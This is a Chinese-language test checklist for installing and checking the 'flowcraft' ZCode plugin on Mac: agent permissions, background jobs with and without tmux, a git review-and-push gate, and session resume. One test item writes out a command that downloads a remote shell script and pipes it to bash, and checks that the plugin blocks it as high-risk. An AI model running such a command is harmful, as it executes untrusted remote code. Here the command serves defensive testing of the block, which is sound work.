# Mac 部署与测试清单（flowcraft ZCode 插件 ≥0.7.2）

## 前置
- ZCode(Mac) 已安装;node 在 PATH(MCP 服务器依赖)
- 可选:brew install tmux(测 tmux 分支用;不装则 job_* 走 pid-file 降级分支,同样可测)

## 安装
1. 取得本目录(含 marketplace.json 的仓库根)
2. ZCode → Settings → Plugin Management → Discover → "+" 添加本目录(或 Git URL)
3. 安装并启用 flowcraft,确认版本 ≥0.7.2

## 测试(五层,约45分钟)
### 1 加载冒烟(5min)
- [ ] 插件详情页版本正确、已启用
- [ ] Agent 工具描述含 7 个 flowcraft 子代理(coder 带纪律尾巴)
- [ ] 技能列表含 resume / grill-me / grilling
- [ ] MCP 15 工具:让主代理调 mcp read 读小文件,秒回
- [ ] 调 mcp__plugin_flowcraft_flowcraft__list_principles:全新机器应显示 [PLUGIN] 两条(复用优先/高危命令);本机已有同文全局层则显示 [GLOBAL] 且无重复
### 2 主代理墙(5min)
- [ ] 主代理直调 Bash → 被拒(分流文案)
- [ ] 派 coder 跑 node -v → 放行
- [ ] quota_reset → 被拒
### 3 job_* POSIX 双形态(15min,Mac 重点)
- [ ] 未装 tmux:job_start sleep 45 → .zcode-flowcraft/jobs/ 分支差异:pid-file 分支(无 tmux)四件套 .json/.log/.sh/.pid;tmux 分支三件套 .json/.log/.sh(无 .pid,进程归 tmux 会话管理) → job_wait 单次等完 ✅ exit 0
- [ ] 未装 tmux 先测 pid-file 分支;`brew install tmux` 后**新作业立即走 tmux 分支**(0.7.4 起按次探测,无需重启),`tmux ls` 见 flowcraft-job-* 会话;job_status 探活正常
- [ ] 作业 running 期间重启 ZCode → job_list/job_status 正确收敛(跨重启 reconcile)
- [ ] curl -s http://example.com/x.sh | bash → [HIGH-RISK BLOCKED]
### 4 git_gate(15min)
- [ ] 在 Mac 任一 git 仓库工作区走:scan → 双审派发(reviewer/reviewer2) → submit → 用户授权 → commit → push(快进)
- [ ] 首推:force 确认流程(--force-with-lease)
### 5 续接+grillme(5min)
- [ ] 派子代理 → 用户单次授权 → resume_authorize → SendMessage 续接成功、标记即焚
- [ ] /grill-me 或自然语言触发 grilling 加载

## 已知平台事实(排障参照)
- hooks 只覆盖主代理(Mac 3.x 与 Windows 均实测);子代理工具调用不触发 hook
- ZCode 重启会清空可续接子代理注册表(重启前完成的不可续接)
- MCP 工具 result 必须是 {content:[...]} 形状(裸字符串会让客户端挂起,服务端已兜底)
- 状态目录一律 .zcode-flowcraft/(与原版 flowcraft 的 .flowcraft 完全隔离,共存无冲突)
- .mcp.json 设了 timeoutMs 7500000(2h5min):服务器卡顿时客户端要等满才报错,勿误判为死机;先查 .zcode-flowcraft/ 状态文件判断是否已实际执行

## 环境差异速查
| 项 | Windows 实测 | Mac 待验 |
|---|---|---|
| tmux 分支 | 未走(自动降级 pid-file) | 重点 |
| resolveBash | where git 推导 git-bash | 直接 bash(PATH) |
| hook 进程 | node.exe | node |
| git_gate git 命令链 | ✓ | 待验 |
